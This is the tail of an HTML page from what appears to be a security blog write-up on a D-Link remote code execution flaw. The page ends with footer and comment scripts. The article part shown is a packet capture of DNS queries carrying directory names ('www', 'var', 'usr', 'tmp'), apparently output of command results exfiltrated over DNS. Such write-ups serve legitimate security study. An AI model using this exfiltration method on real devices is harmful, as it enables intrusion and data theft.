+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.956821</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">:</span> <span class="n">ICMP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="n">udp</span> <span class="n">port</span> <span class="mi">53</span> <span class="n">unreachable</span><span class="o">,</span> <span class="n">length</span> <span class="mi">36</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.957639</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">.</span><span class="mi">49007</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">53</span><span class="o">:</span> <span class="mi">5</span><span class="o">+</span> <span class="n">A</span><span class="o">?</span> <span class="n">www</span><span class="o">.</span> <span class="o">(</span><span class="mi">21</span><span class="o">)</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.957660</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">:</span> <span class="n">ICMP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="n">udp</span> <span class="n">port</span> <span class="mi">53</span> <span class="n">unreachable</span><span class="o">,</span> <span class="n">length</span> <span class="mi">36</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.958327</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">.</span><span class="mi">42641</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">53</span><span class="o">:</span> <span class="mi">6</span><span class="o">+</span> <span class="n">A</span><span class="o">?</span> <span class="n">www</span><span class="o">.</span> <span class="o">(</span><span class="mi">21</span><span class="o">)</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.958351</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">:</span> <span class="n">ICMP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="n">udp</span> <span class="n">port</span> <span class="mi">53</span> <span class="n">unreachable</span><span class="o">,</span> <span class="n">length</span> <span class="mi">36</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.958837</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">.</span><span class="mi">36077</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">53</span><span class="o">:</span> <span class="mi">7</span><span class="o">+</span> <span class="n">A</span><span class="o">?</span> <span class="n">www</span><span class="o">.</span> <span class="o">(</span><span class="mi">21</span><span class="o">)</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.958857</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">:</span> <span class="n">ICMP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="n">udp</span> <span class="n">port</span> <span class="mi">53</span> <span class="n">unreachable</span><span class="o">,</span> <span class="n">length</span> <span class="mi">36</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.965678</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">.</span><span class="mi">49884</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">53</span><span class="o">:</span> <span class="mi">2</span><span class="o">+</span> <span class="n">AAAA</span><span class="o">?</span> <span class="n">var</span><span class="o">.</span> <span class="o">(</span><span class="mi">21</span><span class="o">)</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.965704</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">:</span> <span class="n">ICMP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="n">udp</span> <span class="n">port</span> <span class="mi">53</span> <span class="n">unreachable</span><span class="o">,</span> <span class="n">length</span> <span class="mi">36</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.969792</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">.</span><span class="mi">53144</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">53</span><span class="o">:</span> <span class="mi">3</span><span class="o">+</span> <span class="n">AAAA</span><span class="o">?</span> <span class="n">var</span><span class="o">.</span> <span class="o">(</span><span class="mi">21</span><span class="o">)</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.969820</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">:</span> <span class="n">ICMP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="n">udp</span> <span class="n">port</span> <span class="mi">53</span> <span class="n">unreachable</span><span class="o">,</span> <span class="n">length</span> <span class="mi">36</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.970305</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">.</span><span class="mi">32949</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">53</span><span class="o">:</span> <span class="mi">4</span><span class="o">+</span> <span class="n">AAAA</span><span class="o">?</span> <span class="n">var</span><span class="o">.</span> <span class="o">(</span><span class="mi">21</span><span class="o">)</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.970326</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">:</span> <span class="n">ICMP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="n">udp</span> <span class="n">port</span> <span class="mi">53</span> <span class="n">unreachable</span><span class="o">,</span> <span class="n">length</span> <span class="mi">36</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.970971</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">.</span><span class="mi">48094</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">53</span><span class="o">:</span> <span class="mi">5</span><span class="o">+</span> <span class="n">A</span><span class="o">?</span> <span class="n">var</span><span class="o">.</span> <span class="o">(</span><span class="mi">21</span><span class="o">)</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.970993</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">:</span> <span class="n">ICMP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="n">udp</span> <span class="n">port</span> <span class="mi">53</span> <span class="n">unreachable</span><span class="o">,</span> <span class="n">length</span> <span class="mi">36</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.971505</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">.</span><span class="mi">52246</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">53</span><span class="o">:</span> <span class="mi">6</span><span class="o">+</span> <span class="n">A</span><span class="o">?</span> <span class="n">var</span><span class="o">.</span> <span class="o">(</span><span class="mi">21</span><span class="o">)</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.971516</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">:</span> <span class="n">ICMP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="n">udp</span> <span class="n">port</span> <span class="mi">53</span> <span class="n">unreachable</span><span class="o">,</span> <span class="n">length</span> <span class="mi">36</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.972015</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">.</span><span class="mi">41323</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">53</span><span class="o">:</span> <span class="mi">7</span><span class="o">+</span> <span class="n">A</span><span class="o">?</span> <span class="n">var</span><span class="o">.</span> <span class="o">(</span><span class="mi">21</span><span class="o">)</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.972036</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">:</span> <span class="n">ICMP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="n">udp</span> <span class="n">port</span> <span class="mi">53</span> <span class="n">unreachable</span><span class="o">,</span> <span class="n">length</span> <span class="mi">36</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.974624</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">.</span><span class="mi">50795</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">53</span><span class="o">:</span> <span class="mi">2</span><span class="o">+</span> <span class="n">AAAA</span><span class="o">?</span> <span class="n">usr</span><span class="o">.</span> <span class="o">(</span><span class="mi">21</span><span class="o">)</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.974653</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">:</span> <span class="n">ICMP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="n">udp</span> <span class="n">port</span> <span class="mi">53</span> <span class="n">unreachable</span><span class="o">,</span> <span class="n">length</span> <span class="mi">36</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.975316</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">.</span><span class="mi">38359</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">53</span><span class="o">:</span> <span class="mi">3</span><span class="o">+</span> <span class="n">AAAA</span><span class="o">?</span> <span class="n">usr</span><span class="o">.</span> <span class="o">(</span><span class="mi">21</span><span class="o">)</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.975337</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">:</span> <span class="n">ICMP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="n">udp</span> <span class="n">port</span> <span class="mi">53</span> <span class="n">unreachable</span><span class="o">,</span> <span class="n">length</span> <span class="mi">36</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.975827</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">.</span><span class="mi">55240</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">53</span><span class="o">:</span> <span class="mi">4</span><span class="o">+</span> <span class="n">AAAA</span><span class="o">?</span> <span class="n">usr</span><span class="o">.</span> <span class="o">(</span><span class="mi">21</span><span class="o">)</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.975848</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">:</span> <span class="n">ICMP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="n">udp</span> <span class="n">port</span> <span class="mi">53</span> <span class="n">unreachable</span><span class="o">,</span> <span class="n">length</span> <span class="mi">36</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.976660</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">.</span><span class="mi">44499</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">53</span><span class="o">:</span> <span class="mi">5</span><span class="o">+</span> <span class="n">A</span><span class="o">?</span> <span class="n">usr</span><span class="o">.</span> <span class="o">(</span><span class="mi">21</span><span class="o">)</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.976668</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">:</span> <span class="n">ICMP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="n">udp</span> <span class="n">port</span> <span class="mi">53</span> <span class="n">unreachable</span><span class="o">,</span> <span class="n">length</span> <span class="mi">36</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.979721</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">.</span><span class="mi">57446</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">53</span><span class="o">:</span> <span class="mi">6</span><span class="o">+</span> <span class="n">A</span><span class="o">?</span> <span class="n">usr</span><span class="o">.</span> <span class="o">(</span><span class="mi">21</span><span class="o">)</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.979748</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">:</span> <span class="n">ICMP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="n">udp</span> <span class="n">port</span> <span class="mi">53</span> <span class="n">unreachable</span><span class="o">,</span> <span class="n">length</span> <span class="mi">36</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.980401</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">.</span><span class="mi">35172</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">53</span><span class="o">:</span> <span class="mi">7</span><span class="o">+</span> <span class="n">A</span><span class="o">?</span> <span class="n">usr</span><span class="o">.</span> <span class="o">(</span><span class="mi">21</span><span class="o">)</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.980422</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">:</span> <span class="n">ICMP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="n">udp</span> <span class="n">port</span> <span class="mi">53</span> <span class="n">unreachable</span><span class="o">,</span> <span class="n">length</span> <span class="mi">36</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.983041</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">.</span><span class="mi">60090</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">53</span><span class="o">:</span> <span class="mi">2</span><span class="o">+</span> <span class="n">AAAA</span><span class="o">?</span> <span class="n">tmp</span><span class="o">.</span> <span class="o">(</span><span class="mi">21</span><span class="o">)</span>
+</pre></div>
+        <hr />
+        <p>作者:JenI&#160; &#160; &#160; &#160;转载请注明出处，谢谢</p>
+    </article>
+
+    <hr>
+
+        <div class="comments">
+            <h2>Comments !</h2>
+            <div id="disqus_thread"></div>
+            <script type="text/javascript">
+                var disqus_shortname = 'jenihk';
+                var disqus_identifier = 'security/dlinkRce.html';
+                var disqus_url = 'https://blog.jenisec.org/security/dlinkRce.html';
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//jenihk.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            </script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+ <!--                   
+    <div id="disqus_thread"></div>
+    <script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document, s = d.createElement('script');
+            s.src = '//jenihk.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+-->
+            </div>
+        </div>
+    </div>
+
+    <hr>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <ul class="list-inline text-center">
+                        <li>
+                            <a href="http://weibo.com/1992014191/profile?rightmod=1&wvr=6&mod=personinfo&is_all=1">
+                                <span class="fa-stack fa-lg">
+                                    <i class="icon iconfont">&#xe657;</i>
+                                </span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="http://github.com/jenihk">
+                                <span class="fa-stack fa-lg">
+                                    <i class="icon iconfont">&#xe618;</i>
+                                </span>
+                            </a>
+                        </li>
+                    </ul>
+                    <p class="copyright text-muted">Blog powered by <a href="http://getpelican.com">Pelican</a>,
+                which takes great advantage of <a href="http://python.org">Python</a>.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- jQuery -->
+    <script src="https://blog.jenisec.org/theme/js/jquery.js"></script>
+
+    <!-- Bootstrap Core JavaScript -->
+    <script src="https://blog.jenisec.org/theme/js/bootstrap.min.js"></script>
+
+    <!-- Custom Theme JavaScript -->
+    <script src="https://blog.jenisec.org/theme/js/clean-blog.min.js"></script>
+    
+    <!-- CanvasParticles -->
+    <script src="https://blog.jenisec.org/theme/js/canvas-particle.js"></script>
+
+    
+
+    <script type="text/javascript">
+        CanvasParticle();
+    </script>
+
+    <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-85780345-1']);
+    _gaq.push(['_trackPageview']);
+    (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+    </script>
+<script type="text/javascript">
+    var disqus_shortname = 'jenihk';
+    (function () {
+        var s = document.createElement('script'); s.async = true;
+        s.type = 'text/javascript';
+        s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+    }());
+</script>
+</body>
+
+</html>
